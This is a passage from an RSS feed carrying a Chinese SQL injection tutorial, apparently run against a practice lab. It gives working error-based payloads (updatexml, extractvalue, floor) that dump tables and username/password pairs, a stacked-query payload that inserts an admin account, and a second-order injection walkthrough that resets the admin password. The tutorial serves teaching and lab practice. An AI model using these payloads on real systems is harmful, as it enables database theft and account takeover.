operator&#34;&gt;&gt;&lt;/span&gt;John Doe&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;author&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;price&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;19.99&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;price&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;book&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;我们可以使用UPDATEXML&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;函数来修改一些节点的值：&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;UPDATE&lt;/span&gt; books&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;SET&lt;/span&gt; book &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; UPDATEXML&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;book&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/book/title&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Learning MySQL&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; id &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;上面的语句将会把表中id为&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;的记录的title节点的值修改为&lt;span class=&#34;token string&#34;&gt;&#34;Learning MySQL&#34;&lt;/span&gt;。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;示例二：&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;现在有以下的XML类型的数据：&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;root&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;message&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;sender&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;Tom&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sender&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;receiver&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;Kate&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;receiver&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;content&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;Hello&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; how are you?&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;content&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;message&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;root&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;我们可以使用UPDATEXML&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;函数来替换节点的值，比如将消息内容的值替换为新的内容：&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;UPDATE&lt;/span&gt; messages&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;SET&lt;/span&gt; msg &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; UPDATEXML&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;msg&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/root/message/content&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;I am fine, thank you.&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; id &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;上面的语句将会把表中id为&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;的记录的content节点的值修改为&lt;span class=&#34;token string&#34;&gt;&#34;I am fine, thank you.&#34;&lt;/span&gt;。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;--xpath 语法错误&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;extractvalue&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;	&lt;span class=&#34;token comment&#34;&gt;-- 查询节点内容&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;updatexml&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;		&lt;span class=&#34;token comment&#34;&gt;-- 修改查询到的内容&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;它们的第二个参数都要求是符合xpath语法的字符串&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;如果不满足要求则会报错，并且将查询结果放在报错信息里&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;-- 主键重复（duplicate entry）&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;floor&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;			&lt;span class=&#34;token comment&#34;&gt;-- 返回小于等于该值的最大整数&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;只要是count，rand&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;，&lt;span class=&#34;token keyword&#34;&gt;group&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;by&lt;/span&gt; 三个连用就会造成这种主键重复报错&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;爆数据库&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#爆数据库&#34;&gt;#&lt;/a&gt; 爆数据库&lt;/h4&gt;
&lt;p&gt;?id=1’%20 and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/9689.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;–0x7e 是 &amp;quot;~&amp;quot; 符号的 16 进制，在这作为分隔符&lt;/p&gt;
&lt;h4 id=&#34;爆表&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#爆表&#34;&gt;#&lt;/a&gt; 爆表&lt;/h4&gt;
&lt;p&gt;?id=1’%20 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=“security”),0x7e),1)–+&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/tyuk.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;爆字段&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#爆字段&#34;&gt;#&lt;/a&gt; 爆字段&lt;/h4&gt;
&lt;p&gt;?id=1’%20 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=“security” and table_name=“users” limit 1,1),0x7e),1) %23&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/sdgfbsre.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;爆数据&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#爆数据&#34;&gt;#&lt;/a&gt; 爆数据&lt;/h4&gt;
&lt;p&gt;?id=1’%20 and updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from users limit 4,1),0x7e),1) %23&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/dthsrhtrs.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;extractvalue函数用法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#extractvalue函数用法&#34;&gt;#&lt;/a&gt; –extractvalue 函数用法&lt;/h4&gt;
&lt;p&gt;?id=1’%20 and extractvalue(1,concat(0x7e,(select database()),0x7e))–+&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/shrthrthrhthe.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;–floor()&lt;/p&gt;
&lt;p&gt;?id=1’%20 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a) %23&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/989898.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;堆叠注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#堆叠注入&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;堆叠注入&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;堆叠查询：堆叠查询可以执行多条 SQL 语句，语句之间以分号 (;) 隔开，而堆叠查询注入攻击就是利用此特 点，在第二条语句中构造要执行攻击的语句。 在 mysql 里 mysqli_multi_query 和 mysql_multi_query 这两个函数执行一个或多个针对数据库的查询。多个查询用分号；进行分隔。&lt;/p&gt;
&lt;p&gt;但是堆叠查询只能返回第一条查询信息，不返回后面的信息。 select version ();select database () 堆叠注入的危害是很大的 可以任意使用增删改查的语句，例如删除数据库 修改数据库，添加数据库用户&lt;/p&gt;
&lt;p&gt;-1’ union select 1,2,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()  limit 1)  %23&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/0808.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;把库里所有的表获取出来，再获取字段 -1’ union select 1,2,(select group_concat (column_name) from information_schema.columns where TABLE_NAME=‘users’ limit 1)  %23&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/656565e.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;知道表的列的情况下使用 insert into 插入语句进行增加账号。如果是管理表 直接添加管理员账号即可 登录后台&lt;/p&gt;
&lt;p&gt;id=-999’;insert into users (id,username,password) values (1000,‘admin999’,‘123456’)–+ 访问 1000 即可访问到刚刚添加的账号&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/6666e.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;二次注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二次注入&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;二次注入&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;二次注入漏洞是一种在 Web 应用程序中广泛存在的安全漏洞形式。相对于一次注入漏洞而言，二次注入漏 洞更难以被发现，但是它却具有与一次注入攻击漏洞相同的攻击威力。 二次注入原理 二次注入的原理，在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助&lt;/p&gt;
&lt;p&gt;get_magic_quotes_gpc 对其中的特殊字符进行了转义，但是 addslashes 有一个特点就是虽然参数在过滤 后会添加 “\” 进行转义，但是 “\” 并不会插入到数据库中，在写入数据库的时候还是保留了原来的数 据。 在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接 从数据库中取出了脏数据，没有进行下一步的检验和处理，这样就会造成 SQL 的二次注入。比如在第一次 插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就 形成了二次注入.&lt;/p&gt;
&lt;p&gt;二次注入图解&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/2ci1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;现在密码是 admin 999999&lt;/p&gt;
&lt;p&gt;修改密码页面&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/2ci2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;注册 admin’#&lt;/p&gt;
&lt;p&gt;登陆进去&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/2ci3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改密码&lt;/p&gt;
&lt;p&gt;修改的是 admin 的密码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/2ci4e.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;登陆 admin 账户输入刚才更改的密码成功登陆&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/2ci5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
